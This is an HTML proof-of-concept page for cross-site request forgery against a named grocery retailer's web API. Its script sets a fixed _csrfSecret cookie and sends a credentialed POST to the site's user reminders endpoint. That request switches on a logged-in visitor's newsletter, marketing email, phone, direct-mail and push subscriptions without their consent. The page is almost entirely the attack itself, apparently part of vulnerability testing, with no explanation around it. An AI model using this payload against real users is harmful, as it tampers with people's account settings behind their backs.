<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<title>CSRF PoC</title>
</head>
<body>
<h2>CSRF PoC Manual Submit</h2>

<button id="csrfBtn">Submit CSRF Request</button>

<script>
document.getElementById('csrfBtn').addEventListener('click', function() {
  // Setting the _csrfSecret cookie (note: this won't work cross-origin for real attack)
  document.cookie = "_csrfSecret=IGmw7tbXxfuXh8kvbb6Tyu; path=/;";

  fetch('https://www.mathem.se/tienda-web-api/v1/user/reminders/update/', {
    method: 'POST',
    credentials: 'include', // send cookies
    headers: {
      'Content-Type': 'application/json',
      'Accept': 'application/json'
    },
    body: JSON.stringify({
      subscribed_to_newsletter: true,
      subscribed_to_recipe_plans: true,
      subscribed_to_marketing_email: true,
      subscribed_to_service_information: true,
      subscribed_marketing_survey: true,
      subscribed_marketing_sms: false,
      subscribed_to_service_information_sms: true,
      subscribed_to_delivery_information_push: true,
      subscribed_marketing_push: true,
      subscribed_to_service_information_push: true,
      subscribed_to_order_cutoff_reminder: true,
      reminders_enabled: false,
      reminders_weekday: null,
      reminders_time: null,
      subscribed_marketing_directmail: true,
      subscribed_marketing_phone: true
    })
  }).then(response => response.json())
    .then(data => alert('Response: ' + JSON.stringify(data)))
    .catch(err => alert('Error: ' + err));
});
</script>
</body>
</html>
